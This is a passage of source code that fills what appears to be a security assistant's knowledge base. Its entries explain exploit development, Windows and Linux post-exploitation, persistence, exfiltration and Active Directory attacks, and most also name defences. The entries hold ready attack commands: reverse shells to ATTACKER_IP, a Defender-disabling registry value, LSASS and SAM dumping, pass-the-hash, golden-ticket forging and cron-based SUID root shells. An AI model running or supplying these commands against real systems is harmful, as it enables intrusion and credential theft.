(syscall/library tracing). MITIGATIONS: ASLR (address randomization), DEP/NX (non-executable stack), Stack Canaries (stack smashing protection), PIE (position-independent executables), CFI (control-flow integrity), RELRO (relocation read-only), SafeStack, Shadow Stack.', 1.5)

  add('exploit_development', ['buffer overflow', 'stack overflow', 'stack buffer overflow', 'bof', 'stack smash', 'overflow vulnerability', 'memory corruption'],
    'Buffer Overflow — occurs when a program writes data beyond the allocated buffer boundary, corrupting adjacent memory. STACK-BASED: overwrite return address on the stack to hijack control flow. Classic attack: input > buffer size → overwrites saved EBP → overwrites return address (EIP/RIP) → redirects to attacker shellcode or ROP chain. STEPS: 1) Identify vulnerable function (gets, strcpy, sprintf, scanf without bounds). 2) Determine offset to return address — use cyclic pattern (e.g., pattern_create / pattern_offset from Metasploit or pwntools cyclic()). 3) Control EIP/RIP — place target address at the correct offset. 4) Place shellcode in buffer or use ROP. HEAP-BASED: corrupt heap metadata (chunk headers, free list pointers) to achieve arbitrary write. Techniques: heap spray, use-after-free, double free, fastbin attack, tcache poisoning (glibc), House of Force, House of Spirit, House of Orange. PROTECTIONS: stack canaries detect overwrites, ASLR randomizes addresses, NX/DEP prevents code execution on stack. TOOLS: GDB + pwndbg (examine stack/heap), checksec (check binary protections), pwntools (automate exploitation).', 1.5)

  add('exploit_development', ['format string vulnerability', 'format string attack', 'format string bug', 'printf vulnerability', 'format string exploit', 'format string tester'],
    'Format String Vulnerability — occurs when user-controlled input is passed directly as the format string argument to printf-family functions (printf, fprintf, sprintf, snprintf, syslog). EXPLOITATION: READ memory — %x or %p leak stack values, %s reads string from stack pointer. WRITE memory — %n writes the number of bytes printed so far to an address on the stack. ARBITRARY WRITE: by controlling stack layout, attacker places target address and uses %n to write to it (often to overwrite GOT entries, return addresses, or function pointers). TESTING: supply format specifiers as input: "AAAA%08x.%08x.%08x.%08x" — if hex values appear, the program is vulnerable. Use %p to leak pointers and defeat ASLR. Use Direct Parameter Access (%N$x, %N$n) for precise stack offset targeting. FORMAT STRING TESTER TOOL: systematically inject format specifiers (%x, %s, %p, %n variants) into all input fields, monitor for crashes or information disclosure. PROTECTION: always use printf("%s", user_input) instead of printf(user_input). Compiler warnings: -Wformat -Wformat-security. FORTIFY_SOURCE macro.', 1.4)

  add('exploit_development', ['fuzzing', 'fuzzer', 'fuzz testing', 'custom fuzzing framework', 'tcp fuzzing', 'udp fuzzing', 'file fuzzing', 'api fuzzing', 'mutation fuzzing', 'generation fuzzing'],
    'Fuzzing — automated technique for discovering vulnerabilities by sending malformed, unexpected, or random data to a program and monitoring for crashes, hangs, or unexpected behavior. TYPES: 1) MUTATION-BASED — mutate valid inputs (bit flips, byte insertions, boundary values, known dangerous values). 2) GENERATION-BASED — generate inputs from scratch based on protocol/format specification (grammar-based). 3) COVERAGE-GUIDED — use code coverage feedback to evolve inputs toward new code paths (AFL, libFuzzer, honggfuzz). CUSTOM FUZZING FRAMEWORK: TCP FUZZING — send mutated packets to network services, vary length/content/timing, test protocol state machines. UDP FUZZING — same but connectionless, useful for DNS/DHCP/SNMP. FILE FUZZING — mutate file formats (PDF, PNG, XML, ELF) and open with target application, detect crashes via signal handlers. API FUZZING — fuzz REST/GraphQL/gRPC endpoints with invalid types, boundary values, overlong strings, injection payloads, missing/extra fields. FRAMEWORK COMPONENTS: input generator (templates + mutations), delivery engine (TCP/UDP/file/stdin), crash monitor (ASAN/MSAN/signal handler), corpus manager (minimize + deduplicate), coverage tracker. TOOLS: AFL++ (coverage-guided binary fuzzer), libFuzzer (in-process), Boofuzz (network protocol), Peach Fuzzer (smart fuzzing), Radamsa (mutation engine), Atheris (Python). SANITIZERS: AddressSanitizer (ASAN), MemorySanitizer (MSAN), UndefinedBehaviorSanitizer (UBSAN), ThreadSanitizer (TSAN).', 1.4)

  add('exploit_development', ['rop chain', 'rop chain generation', 'return oriented programming', 'rop gadget', 'gadget chain', 'rop exploit', 'return to libc', 'ret2libc'],
    'ROP Chain Generation — Return-Oriented Programming (ROP) is a technique to execute arbitrary code without injecting new code, bypassing DEP/NX by chaining together small instruction sequences ("gadgets") already present in the binary or loaded libraries. GADGETS: short sequences ending in "ret" (e.g., "pop rdi; ret", "xor eax, eax; ret"). Each gadget pops values from the stack and performs an operation, then returns to the next gadget address on the stack. CHAIN BUILDING: 1) Find gadgets — use ROPgadget, ropper, or radare2 (e.g., ROPgadget --binary ./vuln). 2) Identify needed operations — set registers for syscall or function call (e.g., pop rdi for first argument). 3) Chain gadgets on stack — sequence of [gadget_addr][arg1][gadget_addr][arg2]... 4) Final target — call system("/bin/sh"), execve, or mprotect to make memory executable. RET2LIBC: classic variant — overwrite return address to call libc functions (system, execve) directly. Requires: libc base address (leak via format string or info leak), function offset, "/bin/sh" string address. ADVANCED: ROP + stack pivot (xchg rsp, rax; ret) to move stack to controlled buffer. SIGRETURN-Oriented Programming (SROP): use sigreturn syscall to set all registers. One-gadget: single gadget in libc that calls execve("/bin/sh",...). TOOLS: ROPgadget (Python), ropper, one_gadget (Ruby), pwntools ROP module (automates chain building). MITIGATIONS: ASLR, CFI, Shadow Stack, CET (Intel Control-flow Enforcement Technology).', 1.5)

  add('exploit_development', ['buffer overflow pattern generator', 'pattern create', 'pattern offset', 'cyclic pattern', 'de bruijn sequence', 'offset finder', 'eip offset'],
    'Buffer Overflow Pattern Generator — tool for determining the exact offset to overwrite critical values (return address, SEH handler, etc.) in buffer overflow exploits. HOW IT WORKS: generates a unique cyclic pattern (De Bruijn sequence) where every N-byte substring appears exactly once. WORKFLOW: 1) GENERATE — create a pattern of specified length (e.g., pattern_create -l 500 or pwntools cyclic(500)). 2) SEND — feed the pattern as input to the vulnerable program. 3) CRASH — program crashes, and the overwritten value (EIP/RIP/SEH) contains a unique substring from the pattern. 4) FIND OFFSET — use pattern_offset or cyclic_find() to determine exact byte offset. IMPLEMENTATIONS: Metasploit: pattern_create.rb / pattern_offset.rb. Pwntools: cyclic(length, alphabet, n) / cyclic_find(value). Custom: generate De Bruijn sequence with alphabet={Aa0-Zz9} and subsequence length n=4 (32-bit) or n=8 (64-bit). EXAMPLE (pwntools): from pwn import *; pattern = cyclic(200); # send to target; offset = cyclic_find(0x61616172); # find offset of crash value. USE CASES: stack buffer overflow (EIP offset), SEH-based overflow (nSEH/SEH offset), heap overflow (metadata offset). TIPS: use unique 4-byte or 8-byte subsequences depending on architecture. Check EIP, EBP, ESP, and other registers for pattern values to understand stack layout.', 1.4)

  add('exploit_development', ['shellcode encoder', 'shellcode decoder', 'shellcode encoding', 'payload encoder', 'xor encoder', 'polymorphic shellcode', 'shellcode obfuscation'],
    'Shellcode Encoder / Decoder — transforms raw shellcode to bypass filters, avoid bad characters, and evade detection while remaining functional. ENCODING TECHNIQUES: 1) XOR ENCODING — XOR each byte with a key; decoder stub XORs back at runtime. Simple but effective against basic filters. 2) SUB/ADD ENCODING — encode bytes using arithmetic (sub/add from known value). 3) ALPHA-NUMERIC ENCODING — encode shellcode using only printable ASCII characters (a-z, A-Z, 0-9). Used when input is filtered to printable chars only. 4) UNICODE-SAFE ENCODING — handles Unicode expansion (each byte becomes two bytes). 5) POLYMORPHIC ENCODING — each encoding produces different output with randomized keys and decoder stubs, evading signature-based detection. DECODER STUB: small assembly prepended to encoded shellcode that decodes it in memory before execution. Must itself avoid bad characters. MULTI-STAGE: stage 1 is a small encoded loader that downloads/decodes stage 2 (larger payload). TOOLS: msfvenom (Metasploit — encoders: x86/shikata_ga_nai, x86/xor, x64/xor_dynamic, cmd/powershell_base64), custom XOR encoder (Python script), Veil-Evasion, pwntools shellcraft module. CUSTOM ENCODER WORKFLOW: 1) Identify bad characters. 2) Choose encoding scheme avoiding those chars. 3) Generate decoder stub (also avoiding bad chars). 4) Prepend stub + encoded shellcode. TEST: disassemble result and verify no bad bytes remain.', 1.4)

  add('exploit_development', ['exploit restricted byte finder', 'shellcode restricted bytes', 'exploit restricted characters', 'shellcode byte filter', 'shellcode null byte', 'restricted byte detection', 'exploit byte testing'],
    'Exploit Restricted Byte Finder (commonly known in the security field) — identifies which bytes are modified, dropped, or cause truncation when processed by a vulnerable application. Restricted characters break shellcode and must be excluded from payloads. COMMONLY RESTRICTED BYTES: \\x00 (null — terminates C strings), \\x0a (newline — terminates line-based input), \\x0d (carriage return), \\x20 (space — delimiter in some protocols), \\xff (can cause encoding issues). FINDING METHOD: 1) Generate a test payload containing all 256 byte values (\\x01 through \\xff, excluding \\x00 which is almost always restricted). 2) Send the payload as part of exploit input. 3) Set breakpoint after the copy/read operation. 4) In debugger (GDB/pwndbg), examine memory where payload was copied. 5) Compare sent bytes vs. received bytes — any missing, modified, or truncated bytes are restricted characters. 6) Remove first restricted byte found, regenerate payload, repeat until all are identified. TOOLS: mona.py (Immunity Debugger — !mona bytearray), pwntools (generate all bytes), custom Python scripts. PWNTOOLS EXAMPLE: all_chars = bytes(range(1, 256)); # send in payload. AUTOMATION: compare expected vs actual memory dump, flag differences. NOTE: restricted characters are application-specific — always test per target. Encoded shellcode must not contain any identified restricted characters, including in the decoder stub itself.', 1.2)

  add('exploit_development', ['exploit mitigation', 'aslr bypass', 'dep bypass', 'nx bypass', 'stack canary bypass', 'pie bypass', 'exploit protection bypass'],
    'Exploit Mitigation Bypass Techniques: ASLR BYPASS — information leak (format string, partial overwrite), brute force (32-bit has limited entropy ~8-12 bits), ret2plt (PLT addresses are fixed in non-PIE binaries), partial overwrite (change only lower bytes of address). DEP/NX BYPASS — ROP chains (reuse existing code), ret2libc (call libc functions), mprotect() ROP chain (make memory executable), return-to-csu (use __libc_csu_init gadgets). STACK CANARY BYPASS — information leak (format string %p), byte-by-byte brute force (forking servers), overwrite only up to canary (partial overwrite), master canary overwrite via arbitrary write. PIE BYPASS — requires info leak to determine base address, partial overwrite of lower 12 bits (page-aligned), brute force on 32-bit. RELRO BYPASS — Partial RELRO: overwrite GOT entries. Full RELRO: GOT is read-only, must use other targets (hooks, stack, heap metadata). CFI BYPASS — use valid call targets, COOP (Counterfeit Object-Oriented Programming), DOP (Data-Oriented Programming). GENERAL STRATEGY: 1) checksec to identify protections. 2) Find info leak primitive. 3) Defeat ASLR via leak. 4) Build ROP chain or ret2libc. 5) Deliver payload avoiding bad chars.', 1.4)

  // § SHELLS & BACKDOORS — Remote access techniques
  // ═══════════════════════════════════════════════════════════════════════════════

  add('exploit_development', ['reverse shell', 'reverse shell generator', 'tcp reverse shell', 'http reverse shell', 'https reverse shell', 'reverse tcp shell', 'callback shell'],
    'Reverse Shell Generator (TCP / HTTP / HTTPS) — a reverse shell is a shell session initiated by the target machine back to the attacker, bypassing firewalls that block inbound connections. TCP REVERSE SHELL: target connects to attacker\'s IP:port via raw TCP socket and redirects stdin/stdout/stderr. Common one-liners: Bash: bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1. Python: import socket,subprocess,os; s=socket.socket(); s.connect((IP,PORT)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"]). Netcat: nc -e /bin/sh ATTACKER_IP PORT (or rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f). PowerShell: $client=New-Object System.Net.Sockets.TCPClient(IP,PORT); stream/reader/writer pattern. HTTP REVERSE SHELL: encapsulates shell traffic inside HTTP requests to evade deep packet inspection — target polls attacker\'s HTTP server for commands, sends output in POST requests. HTTPS REVERSE SHELL: same as HTTP but over TLS for encrypted C2 traffic, evading SSL inspection. TOOLS: msfvenom (generate payloads), Metasploit multi/handler (listener), Nishang (PowerShell), socat (encrypted relay), pwncat (Python). LISTENER: nc -lvnp PORT or socat or Metasploit exploit/multi/handler.', 1.4)

  add('exploit_development', ['bind shell', 'bind shell backdoor', 'listening shell', 'shell listener', 'bind tcp shell'],
    'Bind Shell — the target machine opens a listening port and waits for the attacker to connect. Opposite of reverse shell: target binds to a port and serves a shell to anyone who connects. USE CASE: when the attacker cannot receive inbound connections but the target can listen. IMPLEMENTATIONS: Netcat: nc -lvnp PORT -e /bin/sh (or ncat --exec /bin/sh -l PORT). Python: socket.bind(("0.0.0.0", PORT)); socket.listen(); accept connection then redirect stdin/stdout/stderr via subprocess. Socat: socat TCP-LISTEN:PORT,reuseaddr,fork EXEC:/bin/sh. PowerShell: listener that accepts TCP connection and pipes to cmd.exe. DISADVANTAGES: easily detected by port scanners, blocked by firewalls, requires the target to have an open port. Reverse shells are generally preferred. DEFENSE: monitor for unexpected listening ports (netstat -tlnp, ss -tlnp), firewall rules blocking outbound connections on unusual ports. TOOLS: netcat/ncat, socat, Metasploit (exploit/multi/handler with bind_tcp payloads), msfvenom (generate bind shell payloads for various platforms).', 1.3)

  add('exploit_development', ['meterpreter backdoor', 'python backdoor', 'meterpreter style backdoor', 'python rat', 'remote access trojan python', 'python reverse shell advanced'],
    'Meterpreter-Style Python Backdoor — an advanced post-exploitation agent written in Python that mimics Meterpreter functionality. FEATURES: 1) REVERSE CONNECTION — connects back to C2 server over TCP/HTTP/HTTPS. 2) COMMAND EXECUTION — execute system commands and return output. 3) FILE OPERATIONS — upload, download, list, delete files on target. 4) SCREENSHOT CAPTURE — capture target screen using PIL/mss. 5) KEYLOGGING — capture keystrokes using pynput/keyboard. 6) PERSISTENCE — install itself to survive reboots (registry, cron, startup folder). 7) PRIVILEGE ESCALATION — attempt UAC bypass, sudo exploitation. 8) PIVOTING — route traffic through compromised host. ARCHITECTURE: Python socket/requests for C2 communication, subprocess for command execution, threading for concurrent tasks, base64/AES for traffic encryption, JSON for structured C2 protocol. C2 PROTOCOL: beacon (check-in) → task (receive command) → response (send output). EVASION: compile to EXE with PyInstaller/cx_Freeze, obfuscate with PyArmor, encrypt strings, anti-VM checks. TOOLS: Metasploit Meterpreter (original), Pupy (Python RAT), Empire (PowerShell/Python), Covenant (.NET).', 1.3)

  // § WINDOWS POST-EXPLOITATION — Windows-specific techniques
  // ═══════════════════════════════════════════════════════════════════════════════

  add('exploit_development', ['windows registry manipulation', 'registry persistence', 'registry backdoor', 'windows registry attack', 'reg add persistence', 'registry run key'],
    'Windows Registry Manipulation — the Windows Registry is a hierarchical database storing OS and application configuration. Post-exploitation uses: 1) PERSISTENCE — add entries to Run/RunOnce keys (HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run, HKLM\\...\\Run) to execute payloads at login/startup. Command: reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Backdoor /t REG_SZ /d "C:\\payload.exe" /f. 2) UAC BYPASS — modify registry keys to bypass User Account Control (e.g., fodhelper.exe, eventvwr.exe registry hijack). 3) DISABLE SECURITY — disable Windows Defender (HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware=1), disable firewall, turn off UAC. 4) CREDENTIAL HARVESTING — extract cached credentials, saved passwords from registry hives (SAM, SECURITY, SYSTEM). 5) HIDE ARTIFACTS — use registry keys for data storage, store encoded payloads. TOOLS: reg.exe (native), PowerShell (Get-ItemProperty, Set-ItemProperty, New-ItemProperty), Python winreg module, Metasploit post/windows/manage/enable_rdp. DETECTION: monitor registry changes with Sysmon (Event ID 12/13/14), use RegShot for before/after comparisons.', 1.3)

  add('exploit_development', ['token impersonation', 'windows token impersonation', 'access token manipulation', 'impersonate token', 'token stealing', 'privilege escalation token'],
    'Token Impersonation (Windows) — Windows uses access tokens to identify security context of processes/threads. Token impersonation allows a lower-privileged process to assume the identity of a higher-privileged user. TYPES: 1) PRIMARY TOKEN — assigned to processes, represents user identity. 2) IMPERSONATION TOKEN — assigned to threads, used for client impersonation (4 levels: Anonymous, Identification, Impersonation, Delegation). ATTACK: if an attacker has SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege (common for service accounts, IIS, MSSQL), they can steal/impersonate tokens from other processes. TECHNIQUES: Potato attacks (Hot Potato, Juicy Potato, Sweet Potato, Rotten Potato, PrintSpoofer) — abuse Windows services that authenticate as SYSTEM and capture the token. Named Pipe Impersonation — create a named pipe, trick a privileged process into connecting, impersonate its token. TOKEN STEALING WORKFLOW: 1) List running processes. 2) OpenProcess with PROCESS_QUERY_INFORMATION. 3) OpenProcessToken. 4) DuplicateTokenEx. 5) CreateProcessWithTokenW or ImpersonateLoggedOnUser. TOOLS: incognito (Meterpreter module), Tokenvator, SharpToken, PowerSploit (Invoke-TokenManipulation), Windows API (advapi32.dll). DETECTION: monitor for unusual token usage (Event ID 4624 logon type 9, 4672 special privileges).', 1.3)

  add('exploit_development', ['password dumping', 'memory password dump', 'credential dumping memory', 'lsass dump', 'sam dump', 'password extraction', 'dump credentials'],
    'Password Dumping from Memory — extracting credentials stored in Windows process memory, particularly from LSASS (Local Security Authority Subsystem Service). LSASS DUMP: LSASS stores plaintext passwords, NTLM hashes, Kerberos tickets in memory. METHODS: 1) TASK MANAGER — right-click lsass.exe → Create dump file (requires admin). 2) PROCDUMP — procdump.exe -ma lsass.exe lsass.dmp (SysInternals, signed by Microsoft). 3) COMSVCS.DLL — rundll32.exe comsvcs.dll, MiniDump <lsass_pid> dump.dmp full (LOLBin technique). 4) DIRECT API — MiniDumpWriteDump() from dbghelp.dll. 5) NTDS.DIT — dump Active Directory database (contains all domain password hashes): ntdsutil, Volume Shadow Copy, secretsdump.py. SAM DATABASE: contains local account hashes — extract with reg save HKLM\\SAM sam.save, reg save HKLM\\SYSTEM system.save, then use secretsdump.py or samdump2. CACHED CREDENTIALS: DCC2 hashes in HKLM\\SECURITY — crack offline. TOOLS: Mimikatz (sekurlsa::logonpasswords), secretsdump.py (impacket), crackmapexec, LaZagne (all-in-one password recovery), pypykatz (Python Mimikatz). DEFENSE: enable Credential Guard, disable WDigest, enable LSA protection (RunAsPPL), monitor LSASS access (Sysmon Event ID 10).', 1.4)

  add('exploit_development', ['pass the hash', 'pass-the-hash', 'pth attack', 'ntlm pass the hash', 'impacket pass the hash', 'hash relay'],
    'Pass-the-Hash Attack (impacket) — authentication technique where the attacker uses a stolen NTLM hash directly to authenticate without knowing the plaintext password. HOW IT WORKS: Windows NTLM authentication sends a hash-based response — if the attacker has the NT hash, they can compute the correct NTLM response and authenticate. PREREQUISITES: obtain NT hash via credential dumping (Mimikatz, secretsdump.py, SAM extraction). IMPACKET TOOLS: 1) psexec.py — get interactive shell: psexec.py -hashes :NTHASH DOMAIN/user@TARGET. 2) wmiexec.py — execute commands via WMI: wmiexec.py -hashes :NTHASH user@TARGET. 3) smbexec.py — execute via SMB: smbexec.py -hashes :NTHASH user@TARGET. 4) atexec.py — execute via scheduled task. 5) secretsdump.py — dump more credentials from remote host. OTHER TOOLS: Mimikatz (sekurlsa::pth /user:admin /ntlm:HASH /domain:DOMAIN /run:cmd), CrackMapExec (cme smb TARGET -u user -H HASH), evil-winrm (-H hash flag), xfreerdp (/pth:HASH). OVER-PASS-THE-HASH (Pass-the-Key): use NT hash to request Kerberos TGT, then authenticate via Kerberos — stealthier than NTLM. DEFENSE: disable NTLM where possible, use Credential Guard, enable Protected Users group, monitor for Event ID 4624 with logon type 9 (NewCredentials). LATERAL MOVEMENT: PtH enables pivoting across the network to any machine where the hash is valid (same local admin password = same hash).', 1.4)

  add('exploit_development', ['mimikatz', 'credential dumping mimikatz', 'mimikatz integration', 'sekurlsa logonpasswords', 'lsadump', 'kerberos ticket extraction'],
    'Mimikatz Integration / Credential Dumping — Mimikatz is the premier Windows credential extraction tool by Benjamin Delpy. KEY MODULES: 1) sekurlsa::logonpasswords — dump plaintext passwords, NTLM hashes, Kerberos tickets from LSASS memory. 2) sekurlsa::pth — pass-the-hash: spawn process with stolen NTLM hash. 3) sekurlsa::tickets — export Kerberos tickets from memory. 4) lsadump::sam — dump SAM database (local account hashes). 5) lsadump::lsa /patch — dump LSA secrets. 6) lsadump::dcsync — simulate domain controller replication to extract any user\'s hash remotely (requires Replicating Directory Changes privileges). 7) kerberos::golden — create Golden Ticket (forged TGT using krbtgt hash). 8) kerberos::silver — create Silver Ticket (forged TGS for specific service). 9) token::elevate — elevate to SYSTEM token. 10) crypto::certificates — export certificates and private keys. USAGE: privilege::debug (enable SeDebugPrivilege) → sekurlsa::logonpasswords. PYTHON ALTERNATIVES: pypykatz (offline LSASS dump parsing), impacket secretsdump.py (remote extraction). EVASION: dump LSASS offline and parse with pypykatz, use signed binaries (procdump), obfuscate Mimikatz (Invoke-Mimikatz, SharpKatz). DEFENSE: Credential Guard, LSA Protection (RunAsPPL), disable WDigest, Protected Users group.', 1.5)

  // § LINUX POST-EXPLOITATION — Linux-specific techniques
  // ═══════════════════════════════════════════════════════════════════════════════

  add('exploit_development', ['suid enumeration', 'guid enumeration', 'suid privesc', 'suid binary', 'setuid privilege escalation', 'linux suid', 'find suid'],
    'Linux SUID / GUID Enumeration — SUID (Set User ID) and SGID (Set Group ID) are file permission bits that allow executables to run with the privileges of the file owner/group rather than the executing user. ENUMERATION: find / -perm -4000 -type f 2>/dev/null (SUID), find / -perm -2000 -type f 2>/dev/null (SGID), find / -perm -6000 -type f 2>/dev/null (both). EXPLOITATION: if a SUID binary owned by root has a vulnerability or can be abused, it provides privilege escalation to root. COMMON ABUSABLE SUID BINARIES: 1) Known GTFOBins — nmap (--interactive → !sh), find (-exec /bin/sh), vim/vi (:!sh), python/perl/ruby (spawn shell), bash (-p flag preserves SUID), env, cp, mv. 2) Custom SUID binaries — may have buffer overflows, path injection, library hijacking, or command injection. 3) PATH INJECTION — if SUID binary calls a command without absolute path, create malicious version in attacker-controlled directory and prepend to PATH. 4) SHARED LIBRARY HIJACKING — if binary loads .so from writable path, replace with malicious library. TOOLS: LinPEAS, LinEnum, linux-exploit-suggester, GTFOBins (https://gtfobins.github.io/). DEFENSE: minimize SUID binaries, audit regularly, use capabilities instead of SUID, mount filesystems with nosuid option.', 1.3)

  add('exploit_development', ['cron job abuse', 'cron job privilege escalation', 'cron exploitation', 'crontab attack', 'scheduled task linux', 'cron persistence'],
    'Cron Job Abuse Detection — cron jobs are scheduled tasks in Linux that execute scripts/commands at specified intervals. If cron jobs run as root and reference writable scripts/paths, attackers can escalate privileges. ENUMERATION: 1) crontab -l (current user cron), 2) cat /etc/crontab (system cron), 3) ls -la /etc/cron.* (cron directories), 4) cat /var/spool/cron/crontabs/* (all user crontabs, requires root), 5) systemctl list-timers (systemd timers). EXPLOITATION VECTORS: 1) WRITABLE SCRIPT — if a root cron job executes a script writable by the attacker, modify it to add reverse shell or SUID bash: echo "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" >> /path/to/script.sh. 2) WILDCARD INJECTION — if cron uses tar/rsync with wildcards (* in arguments), create specially named files that become flags (e.g., --checkpoint=1 --checkpoint-action=exec=shell.sh for tar). 3) PATH ABUSE — if cron job uses relative paths and PATH is controllable, create malicious binary in earlier PATH directory. 4) MISSING SCRIPT — if cron references a script that does not exist in a writable directory, create it. TOOLS: pspy (monitor processes without root to detect cron execution), LinPEAS, LinEnum. DEFENSE: ensure cron scripts are owned by root with 700 permissions, use absolute paths, avoid wildcards in privileged cron jobs, audit /etc/crontab regularly.', 1.3)

  // § PERSISTENCE & EXFILTRATION — Maintaining access and extracting data
  // ═══════════════════════════════════════════════════════════════════════════════

  add('exploit_development', ['persistence mechanism', 'persistence startup script', 'persistence cron job', 'persistence registry', 'backdoor persistence', 'maintaining access'],
    'Persistence via Startup Scripts / Cron / Registry — techniques to maintain access to a compromised system across reboots and user logoffs. WINDOWS PERSISTENCE: 1) REGISTRY RUN KEYS — HKCU/HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run (execute at login). 2) SCHEDULED TASKS — schtasks /create /tn "Updater" /tr payload.exe /sc onlogon. 3) STARTUP FOLDER — copy payload to %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup. 4) WMI EVENT SUBSCRIPTION — permanent event consumer triggers payload. 5) SERVICES — sc create malservice binPath= payload.exe start= auto. 6) DLL HIJACKING — place malicious DLL in application search path. LINUX PERSISTENCE: 1) CRON JOBS — add entry: (crontab -l; echo "* * * * * /tmp/shell.sh") | crontab -. 2) BASHRC/PROFILE — append reverse shell to ~/.bashrc or /etc/profile. 3) SSH KEYS — add attacker public key to ~/.ssh/authorized_keys. 4) SYSTEMD SERVICE — create /etc/systemd/system/backdoor.service. 5) INIT SCRIPTS — add to /etc/rc.local or init.d. 6) LD_PRELOAD — set in /etc/ld.so.preload to load malicious shared library. DETECTION: autoruns (Windows), chkrootkit/rkhunter (Linux), monitor crontab changes, audit startup locations. TOOLS: Metasploit persistence modules, SharPersist, Empire persistence modules.', 1.3)

  add('exploit_development', ['data exfiltration', 'dns exfiltration', 'icmp exfiltration', 'covert channel', 'data exfil', 'exfiltration technique', 'dns tunneling'],
    'Data Exfiltration over DNS / ICMP / Covert Channels — techniques to smuggle data out of a network using protocols that are often allowed through firewalls. DNS EXFILTRATION: encode stolen data in DNS queries — data is sent as subdomain labels (e.g., base64data.attacker.com). DNS is almost always allowed through firewalls. METHODS: 1) DNS TXT records — query for TXT record, data encoded in response. 2) DNS A/AAAA records — encode data in queried hostname. 3) DNS CNAME — chain data through CNAME responses. TOOLS: dnscat2 (C2 over DNS), iodine (IP-over-DNS tunnel), DNSExfiltrator, Cobalt Strike DNS beacon. ICMP EXFILTRATION: hide data in ICMP echo request/reply payload field. Ping is often allowed through firewalls. TOOLS: icmpsh (ICMP reverse shell), ptunnel (TCP over ICMP), ICMP-TransferTools. OTHER COVERT CHANNELS: 1) HTTP/HTTPS — embed data in headers, cookies, or request parameters. 2) NTP — hide data in NTP packet fields. 3) STEGANOGRAPHY — embed data in images/documents. 4) SOCIAL MEDIA — use allowed platforms as C2 channels (Twitter, Slack, Telegram bots). 5) CLOUD STORAGE — exfil to attacker-controlled S3/GCS bucket. RATE LIMITING: send slowly to avoid detection. ENCODING: base64, hex, custom encoding. DEFENSE: DNS monitoring (high query volume, long subdomains, unusual record types), ICMP payload inspection, DLP solutions, network segmentation.', 1.4)

  // § ACTIVE DIRECTORY ATTACKS — Domain exploitation techniques
  // ═══════════════════════════════════════════════════════════════════════════════

  add('exploit_development', ['kerberoasting', 'kerberoast attack', 'spn attack', 'service ticket cracking', 'tgs cracking', 'kerberos service ticket'],
    'Kerberoasting — Active Directory attack that extracts service account Kerberos tickets (TGS) and cracks them offline to recover plaintext passwords. HOW IT WORKS: any authenticated domain user can request a TGS ticket for any service registered with a Service Principal Name (SPN). The TGS is encrypted with the service account\'s NTLM hash. If the service account has a weak password, the hash can be cracked offline. STEPS: 1) ENUMERATE SPNs — find service accounts with SPNs: setspn -Q */* or GetUserSPNs.py (impacket). 2) REQUEST TGS — use KRB_TGS_REQ for each SPN. 3) EXTRACT TICKET — export TGS ticket (encrypted with service account hash). 4) CRACK OFFLINE — use hashcat (mode 13100) or John the Ripper to crack the ticket. TOOLS: GetUserSPNs.py (impacket) — python GetUserSPNs.py DOMAIN/user:password -dc-ip DC_IP -request, Rubeus (Rubeus.exe kerberoast), PowerView (Invoke-Kerberoast), Mimikatz. TARGETED KERBEROASTING: focus on high-privilege service accounts (e.g., SQL service accounts with domain admin rights). DEFENSE: use strong passwords (25+ chars) for service accounts, use Group Managed Service Accounts (gMSA), monitor for mass TGS requests (Event ID 4769), AES encryption for service accounts.', 1.4)

  add('exploit_development', ['pass the ticket', 'pass-the-ticket', 'kerberos ticket attack', 'golden ticket', 'silver ticket', 'ticket granting ticket', 'ptt attack'],
    'Pass-the-Ticket — Kerberos attack where the attacker uses stolen Kerberos tickets (TGT or TGS) to authenticate as another user without knowing their password. TYPES: 1) PASS-THE-TICKET (PtT) — steal existing TGT from memory and inject into current session. Export: Mimikatz sekurlsa::tickets /export or Rubeus dump. Import: Mimikatz kerberos::ptt ticket.kirbi or Rubeus ptt /ticket:base64. 2) GOLDEN TICKET — forge a TGT using the krbtgt account NTLM hash (obtained via DCSync or NTDS.dit extraction). Grants access to any resource in the domain for any user. Mimikatz: kerberos::golden /user:fakeadmin /domain:DOMAIN /sid:S-1-5-... /krbtgt:HASH /id:500 /ptt. 3) SILVER TICKET — forge a TGS for a specific service using the service account NTLM hash. More targeted than Golden Ticket, harder to detect. Mimikatz: kerberos::golden /user:anyone /domain:DOMAIN /sid:S-1-5-... /target:SERVER /service:cifs /rc4:HASH /ptt. OVERPASS-THE-HASH: convert NTLM hash to Kerberos ticket — Rubeus asktgt /user:admin /rc4:HASH /ptt. TOOLS: Mimikatz, Rubeus, impacket (getTGT.py, getST.py, ticketConverter.py), CrackMapExec. DEFENSE: rotate krbtgt password regularly (twice), monitor for TGT anomalies (unusual lifetimes, encryption types), use AES over RC4.', 1.4)

  add('exploit_development', ['ldap enumeration', 'ldap3 enumeration', 'ldap reconnaissance', 'active directory ldap', 'ldap query attack', 'domain enumeration ldap'],
